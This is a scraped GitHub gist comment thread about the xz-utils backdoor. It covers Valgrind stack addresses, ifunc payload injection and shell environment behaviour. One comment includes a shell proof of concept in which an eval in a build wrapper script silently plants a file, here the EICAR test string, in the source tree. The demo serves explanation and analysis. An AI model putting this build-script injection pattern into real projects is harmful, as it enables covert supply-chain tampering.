      src="/user_content_edits/show_edit_history_log/GC_lADOAGKPrdoAIDIyMzk0OWQ1YTA3NGViYzNkY2U5ZWU3OGJhYWQ5ZTI3zgBMnvM"
      preload
    >
      <include-fragment class="my-3" style="min-width: 100px;" aria-label="Loading...">
        <span data-view-component="true">
  <svg style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" aria-hidden="true" data-view-component="true" class="mx-auto d-block anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg>    <span class="sr-only">Loading</span>
</span>
      </include-fragment>
    </details-menu>
  </details>
</span>

    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <blockquote>
<p dir="auto">sh provides additional insight via environment variables for child processes.</p>
</blockquote>
<p dir="auto">It also does not, because the shell script in question does not export anything new to the environment. The shell only changes envp in three circumstances:</p>
<ul dir="auto">
<li>when a new variable is explicitly added to envp via "export" or "declare -x"</li>
<li>when a variable is explicitly de-exported, say by running declare +x</li>
<li>when an already-exported variable, such as PATH, is changed or unset</li>
</ul>
<p dir="auto">Otherwise every variable change stays local to the shell process.</p>
<p dir="auto">The only additional "insight" is just the well-documented BCJ and lzma alignment parameters.</p>
<p dir="auto">Maybe a doubt that is "at all wrong" also shows the doubter has no experience?</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5021427" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="yvNylG-fqZWLYTQGX3gnhVwpzHRsSyh_-1JXTaNFKjpbpBh0j7h0oB0RtPutYWwVcL_drT_ZkaLpYZPqsFGjgw" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5021427/edit_form?textarea_id=gistcomment-5021427-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/paulfloyd/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/paulfloyd"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/17177100?s=80&amp;v=4" width="40" height="40" alt="@paulfloyd" /></a>
    </div>
    <div id="gistcomment-5021431" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5021431-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/paulfloyd/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/paulfloyd">paulfloyd</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5021431#gistcomment-5021431" id="gistcomment-5021431-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-12T16:35:26Z" class="no-wrap">Apr 12, 2024</relative-time></a>


      <span class="js-comment-edit-history">
  <span class="d-inline-block color-fg-muted">&#8226;</span>

  <details class="details-overlay details-reset d-inline-block dropdown hx_dropdown-fullscreen">
    <summary class="btn-link no-underline color-fg-muted js-notice">
      <div class="position-relative">
        <span>
          edited
          
        </span>
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-triangle-down v-align-middle">
    <path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path>
</svg>
      </div>
    </summary>
    <details-menu
      class="dropdown-menu dropdown-menu-s width-auto py-0 js-comment-edit-history-menu"
      style="max-width: 352px; z-index: 99;"
      src="/user_content_edits/show_edit_history_log/GC_lADOAQYaDNoAIDIyMzk0OWQ1YTA3NGViYzNkY2U5ZWU3OGJhYWQ5ZTI3zgBMnvc"
      preload
    >
      <include-fragment class="my-3" style="min-width: 100px;" aria-label="Loading...">
        <span data-view-component="true">
  <svg style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" aria-hidden="true" data-view-component="true" class="mx-auto d-block anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg>    <span class="sr-only">Loading</span>
</span>
      </include-fragment>
    </details-menu>
  </details>
</span>

    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <p dir="auto">Has anyone done any detailed examination of the exact cause of the Valgrind errors that Freund (and Fedora and maybe other distros) saw?</p>
<p dir="auto"><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2267598" rel="nofollow">https://bugzilla.redhat.com/show_bug.cgi?id=2267598</a></p>
<p dir="auto">I'm mainly curious about the strange stack addresses like 0x6 and 0x77AD31E59B84CFFF. The persons responsible did try to cover up by adding an option to turn off omit-frame-pointer. Does the exploit assume the use of the frame pointer, and if it isn't there gets the stack layout wrong and writes below the stack pointer?  (Below literally means below as in address less than RSP, not from the inverted view of the grow-down stack. But not as far below as the stack guard). omit-frame-pointer may also be affecting Valgrind's stack walking.</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5021431" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="Ad2X4Qp_TPovzh4KAxnTFRqkxKx-Ada9bbwdIwvd2mL0DxkeESQ2BQlDrDVK5cZTU-qpNgcuSClpZhsBgN1AzQ" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5021431/edit_form?textarea_id=gistcomment-5021431-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/flybyray/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/flybyray"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/804661?s=80&amp;v=4" width="40" height="40" alt="@flybyray" /></a>
    </div>
    <div id="gistcomment-5021649" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5021649-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/flybyray/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/flybyray">flybyray</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5021649#gistcomment-5021649" id="gistcomment-5021649-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-12T20:25:05Z" class="no-wrap">Apr 12, 2024</relative-time></a>


      <span class="js-comment-edit-history">
  <span class="d-inline-block color-fg-muted">&#8226;</span>

  <details class="details-overlay details-reset d-inline-block dropdown hx_dropdown-fullscreen">
    <summary class="btn-link no-underline color-fg-muted js-notice">
      <div class="position-relative">
        <span>
          edited
          
        </span>
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-triangle-down v-align-middle">
    <path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path>
</svg>
      </div>
    </summary>
    <details-menu
      class="dropdown-menu dropdown-menu-s width-auto py-0 js-comment-edit-history-menu"
      style="max-width: 352px; z-index: 99;"
      src="/user_content_edits/show_edit_history_log/GC_lADOAAxHNdoAIDIyMzk0OWQ1YTA3NGViYzNkY2U5ZWU3OGJhYWQ5ZTI3zgBMn9E"
      preload
    >
      <include-fragment class="my-3" style="min-width: 100px;" aria-label="Loading...">
        <span data-view-component="true">
  <svg style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" aria-hidden="true" data-view-component="true" class="mx-auto d-block anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg>    <span class="sr-only">Loading</span>
</span>
      </include-fragment>
    </details-menu>
  </details>
</span>

    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <blockquote>
<p dir="auto">Maybe a doubt that is "at all wrong" also shows the doubter has no experience?</p>
</blockquote>
<p dir="auto">Polite as you are, you used " maybe".  Politeness won't help you against a criminal hacker's ideas. The experiences of doubters are often worth more than those of so-called fact-checkers.</p>
<blockquote>
<p dir="auto">because the shell script in question does not export anything new to the environment</p>
</blockquote>
<p dir="auto">if you waited patiently after reading carefully until you really understood what you had read, without ignoring the meaning of the words, you could avoid misinterpretations and make fewer inference errors.<br>
I wrote "insight via environment variables for CHILD processes". How dare are you that you then talk about "does not export anything new to the environment"? I wish you would rather fantasize about the similarity between <code class="notranslate">eval</code> and <code class="notranslate">evil</code>.</p>
<p dir="auto">have you really understood only some of the attack patterns that have already been discussed here? because of course the attackers in a build process don't care about changing the environment! just think about how many places environment variables could appear in logs and the hide-and-seek game would end immediately. I would recommend to you, that you inspect some public build servers and their artifacts and detailed outputs of builds.</p>
<p dir="auto"><strong>The trick is to leave artifacts in the right places as inconspicuously as possible during the build process.</strong></p>
<p dir="auto">But I'm not giving up on you yet. Let's start by making the bold printed a little clearer.<br>
The following should only use the fragments highlighted in the leading comment as a sample. I didn't develop xz, so I'm replacing it with sh. I can't use the --robot --version arguments, but they are almost irrelevant.</p>
<div class="highlight highlight-source-shell" dir="auto"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> this is only pretext normally provided by the task to build the kernel</span>
TEMPDIR=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-s"><span class="pl-pds">$(</span>mktemp -du<span class="pl-pds">)</span></span><span class="pl-pds">"</span></span>
mkdir -p <span class="pl-smi">$TEMPDIR</span>/Artoria2e5/mykernel/scripts
mkdir -p <span class="pl-smi">$TEMPDIR</span>/Artoria2e5/mykernel/prereqs
srctree=<span class="pl-smi">$TEMPDIR</span>/Artoria2e5/mykernel
pre_reqs=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$TEMPDIR</span>/Artoria2e5/mykernel/prereqs/a.txt<span class="pl-pds">"</span></span>
XZ=sh
<span class="pl-k">export</span> XZ
<span class="pl-c1">echo</span> please cleanup <span class="pl-smi">$TEMPDIR</span> when you are <span class="pl-k">done</span>
cat <span class="pl-k">&gt;</span><span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$TEMPDIR</span>/Artoria2e5/mykernel/prereqs/a.txt<span class="pl-pds">"</span></span><span class="pl-s"><span class="pl-k">&lt;&lt;</span>'<span class="pl-k">EOF</span>'</span>
<span class="pl-s">lorem ipsum and some intersting pointers to CANCER</span>
<span class="pl-s"><span class="pl-k">EOF</span></span>
cat <span class="pl-k">&gt;</span><span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$TEMPDIR</span>/Artoria2e5/mykernel/scripts/xz_wrap.sh<span class="pl-pds">"</span></span><span class="pl-s"><span class="pl-k">&lt;&lt;</span>'<span class="pl-k">EOF</span>'</span>
<span class="pl-s">eval "$($XZ -c 'TARGET_DIR='$(dirname ${BASH_SOURCE[0]})/..';echo STEVE_S_LATE_REVENGE_FOR_LINUX="$(grep -Po '\''pointers to \K\S+'\'')";echo $'\''X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'\''&gt; ${TARGET_DIR}/blob.txt')" || exit</span>
<span class="pl-s">#this is just to make it easier to understand the above XZ command would be able to produce this too</span>
<span class="pl-s">echo a $STEVE_S_LATE_REVENGE_FOR_LINUX that attaches itself in an intellectual property sense to everything it touches</span>
<span class="pl-s"><span class="pl-k">EOF</span></span>

<span class="pl-c"><span class="pl-c">#</span> now we are going to "build the kernel" - show casing just relevant maybe malicious part</span>
<span class="pl-c"><span class="pl-c">#</span> original 'cmd_xzkern = cat $(real-prereqs) | sh $(srctree)/scripts/xz_wrap.sh &gt; $@' </span>
cat <span class="pl-smi">${pre_reqs}</span> <span class="pl-k">|</span> sh <span class="pl-smi">${srctree}</span>/scripts/xz_wrap.sh <span class="pl-k">&gt;</span> a_message_to_the_linux_people.txt
<span class="pl-c"><span class="pl-c">#</span> finished nothing special to see</span>

<span class="pl-c"><span class="pl-c">#</span> verify that the build context was modified</span>
cat a_message_to_the_linux_people.txt
find <span class="pl-smi">$TEMPDIR</span> -type f -name blob.txt -exec cat {} <span class="pl-cce">\;</span>

<span class="pl-c"><span class="pl-c">#</span> cleanup</span>
rm -rvf <span class="pl-smi">$TEMPDIR</span></pre></div>
<p dir="auto">unfortunately, based on your reading comprehension, i have to assume that you still won't understand. but maybe there are a few others who can help you further.<br>
The verify step would show you</p>
<ul dir="auto">
<li>'cat a_message_to_the_linux_people.txt'</li>
</ul>
<div class="highlight highlight-text-adblock" dir="auto"><pre class="notranslate">a CANCER that attaches itself in an intellectual property sense to everything it touches</pre></div>
<ul dir="auto">
<li>'find $TEMPDIR -type f -name blob.txt -exec cat {} ;'     # a nice blob placed into <code class="notranslate">srctree</code></li>
</ul>
<div class="highlight highlight-text-adblock" dir="auto"><pre class="notranslate">X5O!P%@AP[4\PZX54(P<span class="pl-k">^</span>)7CC)7}<span class="pl-k">$</span>EICAR-STANDARD-ANTIVIRUS-TEST-FILE!<span class="pl-ii">$</span>H+H*</pre></div>
<p dir="auto">i have done my duty and shown good will</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5021649" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="gSOtnMCOw7xhVPSseDcX_oitg_FtJfueu2SpXMivFMTWUawkDwa1GReETlcjJsHI6NOB3ylOXKEkj4zNbWzMVQ" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5021649/edit_form?textarea_id=gistcomment-5021649-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/dnorthup-ums/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/dnorthup-ums"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/18331571?s=80&amp;v=4" width="40" height="40" alt="@dnorthup-ums" /></a>
    </div>
    <div id="gistcomment-5021652" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5021652-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/dnorthup-ums/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/dnorthup-ums">dnorthup-ums</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5021652#gistcomment-5021652" id="gistcomment-5021652-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-12T20:31:24Z" class="no-wrap">Apr 12, 2024</relative-time></a>


      
    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <blockquote>
<p dir="auto">Has anyone done any detailed examination of the exact cause of the Valgrind errors that Freund (and Fedora and maybe other distros) saw?</p>
<p dir="auto"><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2267598" rel="nofollow">https://bugzilla.redhat.com/show_bug.cgi?id=2267598</a></p>
<p dir="auto">I'm mainly curious about the strange stack addresses like 0x6 and 0x77AD31E59B84CFFF. The persons responsible did try to cover up by adding an option to turn off omit-frame-pointer. Does the exploit assume the use of the frame pointer, and if it isn't there gets the stack layout wrong and writes below the stack pointer? (Below literally means below as in address less than RSP, not from the inverted view of the grow-down stack. But not as far below as the stack guard). omit-frame-pointer may also be affecting Valgrind's stack walking.</p>
</blockquote>
<p dir="auto"><a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/paulfloyd/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/paulfloyd">@paulfloyd</a> The <code class="notranslate">0x6</code> address is pretty easy, that's evidence of something being compiled with the <code class="notranslate">-fPIE</code> compile time flag set, something the build scripts of xz-utils <em>do not</em> do (including the compromised ones). As for the 64-bit <code class="notranslate">0x77...</code> or <code class="notranslate">0xDD2A....</code> addresses, it looks to me like something is trying to be clever and take advantage of the "hole" between typical user space and kernel space when injecting the payload via <code class="notranslate">ifunc</code>. I suspect if you look at one of the disassembly attempts of the exploit you'll get more insight into what is going on there and why those are important (as noted, I strongly suspect they are).</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5021652" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="vJZrX7m6lV0iyEiQLgoReZ2-IyFXAr4g9LqwpZJXhq6Ik68wy7ECe32vg8hM0xIFoKyrx6toIwTw0feHTkNOKQ" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5021652/edit_form?textarea_id=gistcomment-5021652-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/AdrianBunk/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/AdrianBunk"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/3358267?s=80&amp;v=4" width="40" height="40" alt="@AdrianBunk" /></a>
    </div>
    <div id="gistcomment-5021701" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
